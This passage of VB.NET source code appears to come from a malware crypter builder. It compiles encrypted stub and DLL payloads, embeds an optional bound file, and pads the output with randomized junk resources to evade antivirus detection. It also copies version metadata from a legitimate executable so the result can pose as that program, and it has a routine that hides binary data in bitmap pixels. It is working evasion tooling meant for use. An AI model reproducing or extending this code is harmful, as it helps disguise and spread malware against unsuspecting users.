            Parameters.EmbeddedResources.Add(folder_path & "\" & res_RandomIcon(".ico", resource_usg_base & rndval(resource_usg_int, randomstringpool_eng)))
            Parameters.EmbeddedResources.Add(folder_path & "\" & res_RandomBytes(rand.Next(32, 64), ".resources", resource_usg_base & rndval(resource_usg_int, randomstringpool_eng)))
            Parameters.EmbeddedResources.Add(folder_path & "\" & res_RandomString(".resources", resource_usg_base & rndval(resource_usg_int, randomstringpool_eng)))
        Next
        '--------------- Add Junk Resource ---------------

        Dim seal_res_name As String = resource_usg_base & rndval(resource_usg_int, randomstringpool_eng)
        Dim vl As String = clsAES_string.AES_Encrypt("Ns Usernamme: ""Administrator""", "crypterIFALKRFMCXMOJWXNSO")
        GenerateResource(folder_path & "\" & seal_res_name & ".resources", seal_res_name, vl)
        Parameters.EmbeddedResources.Add(folder_path & "\" & seal_res_name & ".resources")

        'Encrypted Main Resource
        Parameters.EmbeddedResources.Add(Main_Bytes)

        'Encrypted Dll Resource
        Parameters.EmbeddedResources.Add(Dll_Bytes)

        Invoke(New System.Windows.Forms.MethodInvoker(Sub()
                                                          'Binder Resource        \ ( Optional )
                                                          If txtBind.Text <> String.Empty Then
                                                              Parameters.EmbeddedResources.Add(Bind_Bytes)
                                                          End If
                                                      End Sub))


        parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Parameters.ReferencedAssemblies.Add("System.Drawing.dll")
        Parameters.CompilerOptions = "/filealign:0x00200 /platform:x86 /define:_MYTYPE=\""Empty\"" /removeintchecks+ /nowarn /target:winexe"

        For Each ErrorPut As System.CodeDom.Compiler.CompilerError In CodeProvider.CompileAssemblyFromSource(Parameters, Source).Errors
            MessageBox.Show("Stub - Looks like we have encountered an error!" & NewLine & _
                                      ErrorPut.ToString & ErrorPut.Line & " | " & ErrorPut.Column & NewLine & _
                                      "Try to crypt again, if the error persists, contact me for a bug report!", msgbox_title & "Error Compiling!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        Next

    End Sub

    Public Sub CompileDll(ByVal Source As String, ByVal Out As String)

        'On Error Resume Next

        Dim ProviderOptions As New System.Collections.Generic.Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")

        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim Parameters As New System.CodeDom.Compiler.CompilerParameters

        Parameters.GenerateExecutable = False
        Parameters.OutputAssembly = Out

        Parameters.CompilerOptions = "/define:_MYTYPE=\""Empty\"" /optimize+ /platform:x86 /debug- /removeintchecks /nowarn /filealign:0x00000200"

        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        Parameters.ReferencedAssemblies.Add("System.Drawing.dll")

        For Each ErrorPut As System.CodeDom.Compiler.CompilerError In CodeProvider.CompileAssemblyFromSource(Parameters, Source).Errors
            MessageBox.Show("Dll - Looks like we have encountered an error!" & NewLine & _
                                      ErrorPut.ToString & ErrorPut.Line & " | " & ErrorPut.Column & NewLine & _
                                      "Try to crypt again, if the error persists, contact me for a bug report!", msgbox_title & "Error Compiling!", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Exit Sub
        Next

    End Sub
#End Region


    Private Sub DivinityButton1_Click(sender As Object, e As EventArgs) Handles btnClone.Click
        Dim opd = New OpenFileDialog
        opd.Filter = "Exe Files |*.exe"
        opd.ShowDialog()

        If File.Exists(opd.FileName) Then

            Dim vinfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(opd.FileName)
            txtProduct.Text = vinfo.ProductName
            txtDesc.Text = vinfo.FileDescription
            txtCopy.Text = vinfo.LegalCopyright
            txtTM.Text = vinfo.LegalTrademarks

        End If
    End Sub
 
    Public Shared Function CreateBitmapFromData(binaryData As Byte()) As Bitmap
        ' calc padding amount
        Dim paddedSize As Integer = binaryData.Length + (3 - binaryData.Length Mod 3) + 6
        Dim pixelCount As Integer = paddedSize / 3

        Dim countPerRow As Integer = CInt(Math.Ceiling(Math.Sqrt(pixelCount)))

        Dim bmp As New Bitmap(countPerRow, countPerRow, PixelFormat.Format24bppRgb)

        Dim paddedData As Byte() = New Byte(paddedSize - 1) {}
        Buffer.BlockCopy(BitConverter.GetBytes(binaryData.Length), 0, paddedData, 0, 4)
        Buffer.BlockCopy(binaryData, 0, paddedData, 4, binaryData.Length)

        Dim columnIndex As Integer = 0
        Dim rowNumber As Integer = bmp.Height - 1
        For i As Integer = 0 To pixelCount - 1
            If columnIndex = countPerRow Then
                columnIndex = 0
                rowNumber -= 1
            End If

            Dim pixelColor As Color = Color.FromArgb(paddedData(i * 3 + 2), paddedData(i * 3 + 1), paddedData(i * 3))
            bmp.SetPixel(columnIndex, rowNumber, pixelColor)

            columnIndex += 1
        Next
        Return bmp
    End Function

End Class
